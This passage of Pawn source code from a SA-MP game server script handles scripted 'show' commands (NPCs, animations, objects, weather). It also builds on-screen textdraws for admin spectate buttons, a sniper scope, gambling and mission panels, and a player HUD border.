	velocity;x,y,z
	velocityme;identity,x,y,z
	weather;wid
	endshow;
	*/
	if(strlen(params) > 0) split(params,showParams,',');
	new player[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, players = 0;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerVirtualWorld(i) == world_show) player[players++] = i;
	if(equal(cmd,"audio"))
	{
		for(new i = 0; i < players; i++) PlayAudioStreamForPlayer(player[i],showParams[0],floatstr(showParams[1]),floatstr(showParams[2]),floatstr(showParams[3]),.usepos = (_:(floatstr(showParams[1]) != 0.0)));
	}
	else if(equal(cmd,"npc"))
	{
		waitingForNPCConnection[waitingConnections][0] = strval(showParams[0]), waitingForNPCConnection[waitingConnections][1] = strval(showParams[2]);
		for(new i = 0; i < 4; i++) theNewNPCPos[waitingConnections][i] = floatstr(showParams[i+3]);
		waitingConnections++;
		ConnectNPC(showParams[1],"idle");
	}
	else if(equal(cmd,"delnpc"))
	{
		new identity = strval(params);
		if(currentShowNPCs[identity] != -1)
		{
			Kick(currentShowNPCs[identity]);
			currentShowNPCs[identity] = INVALID_PLAYER_ID;
		}
	}
	else if(equal(cmd,"editnpc"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1)
		{
			if(strval(showParams[1]) != GetPlayerSkin(currentShowNPCs[identity])) SetPlayerSkin(currentShowNPCs[identity],strval(showParams[1]));
			SetPlayerPos(currentShowNPCs[identity],floatstr(showParams[2]),floatstr(showParams[3]),floatstr(showParams[4]));
			SetPlayerFacingAngle(currentShowNPCs[identity],floatstr(showParams[5]));
		}
	}
	else if(equal(cmd,"weapon"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1) SetPlayerArmedWeapon(currentShowNPCs[identity],strval(showParams[1]));
	}
	else if(equal(cmd,"resetweapon"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1) ResetWeapons(currentShowNPCs[identity]);
	}
	else if(equal(cmd,"rotate"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1) SetPlayerFacingAngle(currentShowNPCs[identity],floatstr(showParams[1]));
	}
	else if(equal(cmd,"dance"))
	{
		new identity = strval(showParams[0]);
		switch(strval(showParams[1]))
		{
			case 1: ApplyAnimation(currentShowNPCs[identity],"DANCING","bd_clap",2.1,1,1,1,1,1);
			case 2: ApplyAnimation(currentShowNPCs[identity],"DANCING","bd_clap1",2.1,1,1,1,1,1);
			case 3: ApplyAnimation(currentShowNPCs[identity],"DANCING","dance_loop",2.1,1,1,1,1,1);
			case 4: ApplyAnimation(currentShowNPCs[identity],"DANCING","DAN_Down_A",2.1,1,1,1,1,1);
			case 5: ApplyAnimation(currentShowNPCs[identity],"DANCING","DAN_Left_A",2.1,1,1,1,1,1);
			case 6: ApplyAnimation(currentShowNPCs[identity],"DANCING","DAN_Loop_A",2.1,1,1,1,1,1);
			case 7: ApplyAnimation(currentShowNPCs[identity],"DANCING","DAN_Right_A",2.1,1,1,1,1,1);
			case 8: ApplyAnimation(currentShowNPCs[identity],"DANCING","DAN_Up_A",2.1,1,1,1,1,1);
			case 9: ApplyAnimation(currentShowNPCs[identity],"DANCING","dnce_M_a",2.1,1,1,1,1,1);
			case 10: ApplyAnimation(currentShowNPCs[identity],"DANCING","dnce_M_b",2.1,1,1,1,1,1);
			case 11: ApplyAnimation(currentShowNPCs[identity],"DANCING","dnce_M_c",2.1,1,1,1,1,1);
			case 12: ApplyAnimation(currentShowNPCs[identity],"DANCING","dnce_M_d",2.1,1,1,1,1,1);
			case 13: ApplyAnimation(currentShowNPCs[identity],"DANCING","dnce_M_e",2.1,1,1,1,1,1);
		}
	}
	else if(equal(cmd,"anim"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1) ApplyAnimation(currentShowNPCs[identity],showParams[1],showParams[2],4.1,strval(showParams[3]),strval(showParams[4]),strval(showParams[5]),strval(showParams[6]),strval(showParams[7]));
	}
	else if(equal(cmd,"animall"))
	{
		for(new i = 0; i < MAX_SHOW_NPCS; i++) if(currentShowNPCs[i] != -1) ApplyAnimation(currentShowNPCs[i],showParams[0],showParams[1],4.1,strval(showParams[2]),strval(showParams[3]),strval(showParams[4]),strval(showParams[5]),strval(showParams[6]));
	}
	else if(equal(cmd,"attach"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1) SetPlayerAttachedObject(currentShowNPCs[identity],strval(showParams[1]),strval(showParams[2]),strval(showParams[3]),floatstr(showParams[4]),floatstr(showParams[5]),floatstr(showParams[6]),floatstr(showParams[7]),floatstr(showParams[8]),floatstr(showParams[9]),floatstr(showParams[10]),floatstr(showParams[11]),floatstr(showParams[12]));
	}
	else if(equal(cmd,"rattach"))
	{
		new identity = strval(params);
		if(currentShowNPCs[identity] != -1) if(IsPlayerAttachedObjectSlotUsed(currentShowNPCs[identity],strval(showParams[1]))) RemovePlayerAttachedObject(currentShowNPCs[identity],strval(showParams[1]));
	}
	else if(equal(cmd,"say"))
	{
		new identity = strval(showParams[0]), string[M_S], texttosay[M_S];
		if(currentShowNPCs[identity] != -1)
		{
			strmid(texttosay,params,strfind(params,",",.pos=strfind(params,",")+1)+1,strlen(params));
			new c = white;
			for(new i = 0; i < sizeof(Colors); i++) if(equal(showParams[1],Colors[i][colName])) c = Colors[i][colHex];
			format(string,sizeof(string),"%s:\n%s",GetName(currentShowNPCs[identity]),texttosay);
			SetPlayerChatBubble(currentShowNPCs[identity],texttosay,c,15.0,5000);
			format(string,sizeof(string)," [фхЇЄф] %s: " @c(white) "%s",GetName(currentShowNPCs[identity]),texttosay);
			SendClientMessageToAll(GetPlayerColor(currentShowNPCs[identity]),string);
		}
	}
	else if(equal(cmd,"object"))
	{
		SetTimerEx("ObjectTimerAct",strval(showParams[7]),0,"iiiii",CreateSObject(strval(showParams[0]),floatstr(showParams[1]),floatstr(showParams[2]),floatstr(showParams[3]),floatstr(showParams[4]),floatstr(showParams[5]),floatstr(showParams[6]),object_show_distance,0,world_show),0,0,1,world_show);
		for(new i = 0; i < players; i++) Streamer_Update(player[i]);
	}
	else if(equal(cmd,"mobject"))
	{
		new oid = CreateSObject(strval(showParams[0]),floatstr(showParams[1]),floatstr(showParams[2]),floatstr(showParams[3]),floatstr(showParams[4]),floatstr(showParams[5]),floatstr(showParams[6]),object_show_distance,0,world_show), duration = strval(showParams[14]);
		MoveSObject(oid,floatstr(showParams[7]),floatstr(showParams[8]),floatstr(showParams[9]),floatstr(showParams[13]),floatstr(showParams[10]),floatstr(showParams[11]),floatstr(showParams[12]));
		if(!duration) objectinfo[oid][odam] = 1;
		else SetTimerEx("ObjectTimerAct",duration,0,"iiiii",oid,0,0,1,world_normal);
		for(new i = 0; i < players; i++) Streamer_Update(player[i]);
	}
	else if(equal(cmd,"boom"))
	{
		CreateExplosion(floatstr(showParams[1]),floatstr(showParams[2]),floatstr(showParams[3]),strval(showParams[0]),floatstr(showParams[4]));
	}
	else if(equal(cmd,"health"))
	{
		for(new i = 0; i < players; i++) SetPlayerHealth(player[i],floatstr(showParams[0]));
	}
	else if(equal(cmd,"velocity"))
	{
		for(new i = 0; i < players; i++) SetPlayerVelocity(player[i],floatstr(showParams[0]),floatstr(showParams[1]),floatstr(showParams[2]));
	}
	else if(equal(cmd,"velocityme"))
	{
		new identity = strval(showParams[0]);
		if(currentShowNPCs[identity] != -1) SetPlayerVelocity(currentShowNPCs[identity],floatstr(showParams[1]),floatstr(showParams[2]),floatstr(showParams[3]));
	}
	else if(equal(cmd,"weather"))
	{
		for(new i = 0; i < players; i++) SetPlayerWeather(player[i],strval(showParams[0]));
	}
	else if(equal(cmd,"endshow"))
	{
		EndShow();
	}
}
//=[LoadTextDraws]==============================================================
stock LoadTextDraws()
{
	hidemap = TextDrawCreate(33.000000,323.000000," ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~");
	TextDrawUseBox(hidemap,1);
	TextDrawBoxColor(hidemap,rgba2hex(0,0,255,225));
	TextDrawTextSize(hidemap,140.000000,21.000000);
	TextDrawAlignment(hidemap,0);
	TextDrawBackgroundColor(hidemap,0x000000ff);
	TextDrawFont(hidemap,3);
	TextDrawLetterSize(hidemap,1.000000,1.000000);
	TextDrawColor(hidemap,0x00000000);
	TextDrawSetOutline(hidemap,1);
	TextDrawSetProportional(hidemap,1);
	TextDrawSetShadow(hidemap,1);
	fadeText = TextDrawCreate(0.0,0.0,"~r~");
	TextDrawTextSize(fadeText,640,480);
	TextDrawLetterSize(fadeText,0.0,50.0);
	TextDrawUseBox(fadeText,1);
	spectext[0] = TextDrawCreate(580.000000,130.000000,"View");
	TextDrawAlignment(spectext[0],2);
	TextDrawBackgroundColor(spectext[0],-1);
	TextDrawFont(spectext[0],1);
	TextDrawLetterSize(spectext[0],0.559999,1.700000);
	TextDrawColor(spectext[0],65535);
	TextDrawUseBox(spectext[0],1);
	TextDrawBoxColor(spectext[0],-858993409);
	TextDrawTextSize(spectext[0],45.000000,45.000000);
	spectext[1] = TextDrawCreate(580.000000,161.000000,"Ban");
	TextDrawAlignment(spectext[1],2);
	TextDrawBackgroundColor(spectext[1],-1);
	TextDrawFont(spectext[1],1);
	TextDrawLetterSize(spectext[1],0.559999,1.700000);
	TextDrawColor(spectext[1],-16776961);
	TextDrawUseBox(spectext[1],1);
	TextDrawBoxColor(spectext[1],-858993409);
	TextDrawTextSize(spectext[1],45.000000,45.000000);//351
	spectext[2] = TextDrawCreate(580.000000,192.000000,"Kick");
	TextDrawAlignment(spectext[2],2);
	TextDrawBackgroundColor(spectext[2],-1);
	TextDrawFont(spectext[2],1);
	TextDrawLetterSize(spectext[2],0.559999,1.700000);
	TextDrawColor(spectext[2],255);
	TextDrawUseBox(spectext[2],1);
	TextDrawBoxColor(spectext[2],-858993409);
	TextDrawTextSize(spectext[2],45.000000,45.000000);
	spectext[3] = TextDrawCreate(580.000000,223.000000,"Boom");
	TextDrawAlignment(spectext[3],2);
	TextDrawBackgroundColor(spectext[3],-1);
	TextDrawFont(spectext[3],1);
	TextDrawLetterSize(spectext[3],0.559999,1.700000);
	TextDrawColor(spectext[3],255);
	TextDrawUseBox(spectext[3],1);
	TextDrawBoxColor(spectext[3],-858993409);
	TextDrawTextSize(spectext[3],45.000000,45.000000);
	spectext[4] = TextDrawCreate(580.000000,254.000000,"Slap");
	TextDrawAlignment(spectext[4],2);
	TextDrawBackgroundColor(spectext[4],-1);
	TextDrawFont(spectext[4],1);
	TextDrawLetterSize(spectext[4],0.559999,1.700000);
	TextDrawColor(spectext[4],255);
	TextDrawUseBox(spectext[4],1);
	TextDrawBoxColor(spectext[4],-858993409);
	TextDrawTextSize(spectext[4],45.000000,45.000000);
	spectext[5] = TextDrawCreate(580.000000,285.000000,"Kill");
	TextDrawAlignment(spectext[5],2);
	TextDrawBackgroundColor(spectext[5],-1);
	TextDrawFont(spectext[5],1);
	TextDrawLetterSize(spectext[5],0.559999,1.700000);
	TextDrawColor(spectext[5],255);
	TextDrawUseBox(spectext[5],1);
	TextDrawBoxColor(spectext[5],-858993409);
	TextDrawTextSize(spectext[5],45.000000,45.000000);
	spectext[6] = TextDrawCreate(543.000000,327.000000,"Ban: Godmod");
	TextDrawAlignment(spectext[6],2);
	TextDrawBackgroundColor(spectext[6],-1);
	TextDrawFont(spectext[6],1);
	TextDrawLetterSize(spectext[6],0.450000,1.300000);
	TextDrawColor(spectext[6],-16776961);
	TextDrawUseBox(spectext[6],1);
	TextDrawBoxColor(spectext[6],-858993409);
	TextDrawTextSize(spectext[6],55.000000,45.000000);
	spectext[7] = TextDrawCreate(543.000000,347.000000,"Ban: Weapons");
	TextDrawAlignment(spectext[7],2);
	TextDrawBackgroundColor(spectext[7],-1);
	TextDrawFont(spectext[7],1);
	TextDrawLetterSize(spectext[7],0.450000,1.300000);
	TextDrawColor(spectext[7],-16776961);
	TextDrawUseBox(spectext[7],1);
	TextDrawBoxColor(spectext[7],-858993409);
	TextDrawTextSize(spectext[7],55.000000,45.000000);
	spectext[8] = TextDrawCreate(543.000000,367.000000,"Ban: Speed");
	TextDrawAlignment(spectext[8],2);
	TextDrawBackgroundColor(spectext[8],-1);
	TextDrawFont(spectext[8],1);
	TextDrawLetterSize(spectext[8],0.450000,1.300000);
	TextDrawColor(spectext[8],-16776961);
	TextDrawUseBox(spectext[8],1);
	TextDrawBoxColor(spectext[8],-858993409);
	TextDrawTextSize(spectext[8],55.000000,45.000000);
	spectext[9] = TextDrawCreate(514.000000,130.000000,"OFF");
	TextDrawAlignment(spectext[9],2);
	TextDrawBackgroundColor(spectext[9],-1);
	TextDrawFont(spectext[9],1);
	TextDrawLetterSize(spectext[9],0.559999,1.700000);
	TextDrawColor(spectext[9],65535);
	TextDrawUseBox(spectext[9],1);
	TextDrawBoxColor(spectext[9],-858993409);
	TextDrawTextSize(spectext[9],45.000000,45.000000);
	for(new i = 0; i < sizeof(spectext); i++)
	{
		TextDrawSetProportional(spectext[i],1);
		TextDrawSetOutline(spectext[i],1);
		TextDrawSetSelectable(spectext[i],1);
	}
	snipertext[0] = TextDrawCreate(309.000000,213.000000,"ld_beat:cring");
	TextDrawBackgroundColor(snipertext[0],255);
	TextDrawFont(snipertext[0],4);
	TextDrawLetterSize(snipertext[0],0.500000,1.000000);
	TextDrawColor(snipertext[0],-1);
	TextDrawSetOutline(snipertext[0],0);
	TextDrawSetProportional(snipertext[0],1);
	TextDrawSetShadow(snipertext[0],1);
	TextDrawUseBox(snipertext[0],1);
	TextDrawBoxColor(snipertext[0],255);
	TextDrawTextSize(snipertext[0],22.000000,22.000000);
	snipertext[1] = TextDrawCreate(315.000000,219.000000,"ld_beat:circle");
	TextDrawBackgroundColor(snipertext[1],255);
	TextDrawFont(snipertext[1],4);
	TextDrawLetterSize(snipertext[1],0.270000,1.000000);
	TextDrawColor(snipertext[1],-1);
	TextDrawSetOutline(snipertext[1],0);
	TextDrawSetProportional(snipertext[1],1);
	TextDrawSetShadow(snipertext[1],1);
	TextDrawUseBox(snipertext[1],1);
	TextDrawBoxColor(snipertext[1],255);
	TextDrawTextSize(snipertext[1],10.000000,10.000000);
	reloading = TextDrawCreate(491.000000,43.000000,"-Reloading-");
	TextDrawBackgroundColor(reloading,255);
	TextDrawFont(reloading,1);
	TextDrawLetterSize(reloading,0.300000,1.299999);
	TextDrawColor(reloading,-1800218881);
	TextDrawSetOutline(reloading,1);
	TextDrawSetProportional(reloading,1);
	new string[64];
	const Float:dist = 20.0;
	for(new i = 0; i < sizeof(StatsFields); i++)
	{
		format(string,sizeof(string),"%s>>  ~w~~h~%s",StatsFields[i][sfColor],StatsFields[i][sfText]);
		StatsFields[i][sfTD][0] = TextDrawCreate(10.0,130.0 + floatmul(dist,float(i)),string);
		TextDrawBackgroundColor(StatsFields[i][sfTD][0],255);
		TextDrawFont(StatsFields[i][sfTD][0],1);
		TextDrawLetterSize(StatsFields[i][sfTD][0],0.639999,2.299998);
		TextDrawColor(StatsFields[i][sfTD][0],-1);
		TextDrawSetOutline(StatsFields[i][sfTD][0],1);
		TextDrawSetProportional(StatsFields[i][sfTD][0],1);
		TextDrawSetSelectable(StatsFields[i][sfTD][0],1);
		TextDrawTextSize(StatsFields[i][sfTD][0],200.000000,14.000000);
		StatsFields[i][sfTD][1] = TextDrawCreate(45.0,134.0 + floatmul(dist,float(i)),StatsFields[i][sfTXD]);
		TextDrawBackgroundColor(StatsFields[i][sfTD][1],255);
		TextDrawFont(StatsFields[i][sfTD][1],4);
		TextDrawColor(StatsFields[i][sfTD][1],-1);
		TextDrawSetOutline(StatsFields[i][sfTD][1],0);
		TextDrawSetProportional(StatsFields[i][sfTD][1],1);
		TextDrawSetShadow(StatsFields[i][sfTD][1],1);
		TextDrawUseBox(StatsFields[i][sfTD][1],1);
		TextDrawBoxColor(StatsFields[i][sfTD][1],255);
		TextDrawTextSize(StatsFields[i][sfTD][1],14.000000,14.000000);
		TextDrawSetSelectable(StatsFields[i][sfTD][1],1);
	}
	for(new i = 0, c = rgba2hex(150,150,150,75); i < 5; i++)
	{
		badcamera[i] = TextDrawCreate(0.0,-1.0 + (110 * i),".");
		TextDrawBackgroundColor(badcamera[i],255);
		TextDrawFont(badcamera[i],1);
		TextDrawLetterSize(badcamera[i],-0.900000,6.000000);
		TextDrawColor(badcamera[i],0);
		TextDrawSetOutline(badcamera[i],0);
		TextDrawSetProportional(badcamera[i],1);
		TextDrawSetShadow(badcamera[i],0);
		TextDrawUseBox(badcamera[i],1);
		TextDrawBoxColor(badcamera[i],c);
		TextDrawTextSize(badcamera[0],650.000000,0.000000);
	}
	badcamera[5] = TextDrawCreate(0.000000,0.000000,".");
	TextDrawBackgroundColor(badcamera[5],255);
	TextDrawFont(badcamera[5],1);
	TextDrawLetterSize(badcamera[5],-0.899999,51.000000);
	TextDrawColor(badcamera[5],842150450);
	TextDrawSetOutline(badcamera[5],0);
	TextDrawSetProportional(badcamera[5],1);
	TextDrawSetShadow(badcamera[5],0);
	TextDrawUseBox(badcamera[5],1);
	TextDrawBoxColor(badcamera[5],842150475);
	TextDrawTextSize(badcamera[5],650.000000,30.000000);
	gambletxt[0] = TextDrawCreate(162.000000,178.000000,".");
	TextDrawBackgroundColor(gambletxt[0],255);
	TextDrawFont(gambletxt[0],1);
	TextDrawLetterSize(gambletxt[0],0.500000,13.000000);
	TextDrawColor(gambletxt[0],0);
	TextDrawSetOutline(gambletxt[0],0);
	TextDrawSetProportional(gambletxt[0],1);
	TextDrawSetShadow(gambletxt[0],0);
	TextDrawUseBox(gambletxt[0],1);
	TextDrawBoxColor(gambletxt[0],2105376125);
	TextDrawTextSize(gambletxt[0],500.000000,50.000000);
	gambletxt[1] = TextDrawCreate(163.000000,174.000000,"United DM - Gambling");
	TextDrawBackgroundColor(gambletxt[1],255);
	TextDrawFont(gambletxt[1],2);
	TextDrawLetterSize(gambletxt[1],0.500000,2.000000);
	TextDrawColor(gambletxt[1],65535);
	TextDrawSetOutline(gambletxt[1],0);
	TextDrawSetProportional(gambletxt[1],1);
	TextDrawSetShadow(gambletxt[1],1);
	gambletxt[2] = TextDrawCreate(177.000000,280.000000,"GO!");
	TextDrawBackgroundColor(gambletxt[2],255);
	TextDrawFont(gambletxt[2],1);
	TextDrawLetterSize(gambletxt[2],0.500000,1.400000);
	TextDrawColor(gambletxt[2],-1);
	TextDrawSetOutline(gambletxt[2],0);
	TextDrawSetProportional(gambletxt[2],1);
	TextDrawSetShadow(gambletxt[2],0);
	TextDrawUseBox(gambletxt[2],1);
	TextDrawBoxColor(gambletxt[2],422771360);
	TextDrawTextSize(gambletxt[2],208.000000,20.000000);
	TextDrawSetSelectable(gambletxt[2],1);
	unafktext = TextDrawCreate(90.000000,306.000000,"~b~AFK~n~~w~Press ~r~/back ~w~to play");
	TextDrawAlignment(unafktext,2);
	TextDrawBackgroundColor(unafktext,255);
	TextDrawFont(unafktext,1);
	TextDrawLetterSize(unafktext,0.500000,1.600000);
	TextDrawColor(unafktext,-1);
	TextDrawSetOutline(unafktext,1);
	TextDrawSetProportional(unafktext,1);
	return 1;
}
//=[CreateMissionTD]============================================================
stock CreateMissionTD(playerid,mname[])
{
   	playerinfo[playerid][mtexts][0] = CreatePlayerTextDraw(playerid,146.000000, 363.000000,mname);
	PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][mtexts][0], 255);
	PlayerTextDrawFont(playerid,playerinfo[playerid][mtexts][0], 2);
	PlayerTextDrawLetterSize(playerid,playerinfo[playerid][mtexts][0], 0.230000, 1.100000);
	PlayerTextDrawColor(playerid,playerinfo[playerid][mtexts][0], -1);
	PlayerTextDrawSetOutline(playerid,playerinfo[playerid][mtexts][0], 1);
	PlayerTextDrawSetProportional(playerid,playerinfo[playerid][mtexts][0], 1);
	playerinfo[playerid][mtexts][1] = CreatePlayerTextDraw(playerid,146.000000, 375.000000, "~g~Time Left: ~w~300");
	PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][mtexts][1], 255);
	PlayerTextDrawFont(playerid,playerinfo[playerid][mtexts][1], 2);
	PlayerTextDrawLetterSize(playerid,playerinfo[playerid][mtexts][1], 0.230000, 1.100000);
	PlayerTextDrawColor(playerid,playerinfo[playerid][mtexts][1], -1);
	PlayerTextDrawSetOutline(playerid,playerinfo[playerid][mtexts][1], 1);
	PlayerTextDrawSetProportional(playerid,playerinfo[playerid][mtexts][1], 1);
	new str[M_S];
	format(str, M_S, "~r~Status: ~w~0/%d", MAX_MISSION_TARGETS);
	playerinfo[playerid][mtexts][2] = CreatePlayerTextDraw(playerid,146.000000, 386.000000, str);
	PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][mtexts][2], 255);
	PlayerTextDrawFont(playerid,playerinfo[playerid][mtexts][2], 2);
	PlayerTextDrawLetterSize(playerid,playerinfo[playerid][mtexts][2], 0.230000, 1.100000);
	PlayerTextDrawColor(playerid,playerinfo[playerid][mtexts][2], -1);
	PlayerTextDrawSetOutline(playerid,playerinfo[playerid][mtexts][2], 1);
	PlayerTextDrawSetProportional(playerid,playerinfo[playerid][mtexts][2], 1);
}
//=[BorderAlpha]================================================================
stock BorderAlpha(playerid,type)
{
	if(!playerinfo[playerid][borderalpha]) return 0;
	switch(type)
	{
		case 0: // first line
			switch(playerinfo[playerid][borderalpha])
			{
				case 1: return 75;
				case 2: return 125;
				case 3: return 175;
			}
		case 1: // second line
			switch(playerinfo[playerid][borderalpha])
			{
				case 1: return 50;
				case 2: return 100;
				case 3: return 150;
			}
		case 2: // seperators
			switch(playerinfo[playerid][borderalpha])
			{
				case 1: return 175;
				case 2: return 225;
				case 3: return 255;
			}
	}
	return 0;
}
//=[Border]=====================================================================
stock Border(playerid,act[])
{
	new string[128], col = rgba2hex(playerinfo[playerid][borderrgb][0],playerinfo[playerid][borderrgb][1],playerinfo[playerid][borderrgb][2],255);
	if(equal(act,"create"))
	{
		playerinfo[playerid][border][0] = CreatePlayerTextDraw(playerid,3.000000,441.000000,"_");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][0],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][0],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][0],0.339998,0.299998);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][0],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][0],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][0],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][0],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][0],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][0],setAlpha(col,BorderAlpha(playerid,0)));
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][0],637.000000,-9.000000);
		playerinfo[playerid][border][1] = CreatePlayerTextDraw(playerid,3.000000,431.000000,"_");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][1],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][1],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][1],0.339998,1.500000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][1],100);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][1],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][1],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][1],1);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][1],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][1],setAlpha(col,BorderAlpha(playerid,1)));
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][1],637.000000,-10.000000);
		playerinfo[playerid][border][2] = CreatePlayerTextDraw(playerid,3.000000,430.000000,"_");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][2],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][2],0);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][2],0.589999,-0.500000);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][2],255);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][2],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][2],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][2],0);
		PlayerTextDrawUseBox(playerid,playerinfo[playerid][border][2],1);
		PlayerTextDrawBoxColor(playerid,playerinfo[playerid][border][2],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][2],637.000000,-2.000000);
		playerinfo[playerid][border][3] = CreatePlayerTextDraw(playerid,3.000000,428.000000,webpage);
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][3],-156);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][3],3);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][3],0.529999,1.799999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][3],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][3],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][3],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][3],1);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][3],99.000000,14.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][3],1);
		playerinfo[playerid][border][4] = CreatePlayerTextDraw(playerid,105.000000,345.000000,".");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][4],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][4],3);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][4],0.159999,12.800003);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][4],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][4],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][4],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][4],0);
		playerinfo[playerid][border][5] = CreatePlayerTextDraw(playerid,466.000000,430.000000,"Nickname");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][5],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][5],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][5],0.279998,1.499999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][5],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][5],1);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][5],1);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][5],599.000000,14.000000); // 599
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][5],1);
		playerinfo[playerid][border][6] = CreatePlayerTextDraw(playerid,127.000000,430.000000,"Level 00");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][6],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][6],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][6],0.279998,1.499999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][6],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][6],1);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][6],1);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][6],173.000000,14.000000);
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][6],1);
		playerinfo[playerid][border][7] = CreatePlayerTextDraw(playerid,173.000000,345.000000,".");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][7],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][7],3);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][7],0.159998,12.800003);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][7],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][7],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][7],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][7],0);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][7],173.000000,0.000000);
		playerinfo[playerid][border][8] = CreatePlayerTextDraw(playerid,194.000000,430.000000,"00000000");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][8],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][8],1);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][8],0.279998,1.499999);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][8],-1);
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][8],1);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][8],1);
		PlayerTextDrawTextSize(playerid,playerinfo[playerid][border][8],250.000000,14.000000); // 250
		PlayerTextDrawSetSelectable(playerid,playerinfo[playerid][border][8],1);
		playerinfo[playerid][border][9] = CreatePlayerTextDraw(playerid,253.000000,345.000000,".");
		PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][border][9],255);
		PlayerTextDrawFont(playerid,playerinfo[playerid][border][9],3);
		PlayerTextDrawLetterSize(playerid,playerinfo[playerid][border][9],0.159998,12.800003);
		PlayerTextDrawColor(playerid,playerinfo[playerid][border][9],setAlpha(col,BorderAlpha(playerid,2)));
		PlayerTextDrawSetOutline(playerid,playerinfo[playerid][border][9],0);
		PlayerTextDrawSetProportional(playerid,playerinfo[playerid][border][9],1);
		PlayerTextDrawSetShadow(playerid,playerinfo[playerid][border][9],0);
		playerinfo[playerid][border][10] = CreatePlayerTextDraw(playerid,274.000000,430.000000,"00/00/0000 00:00");
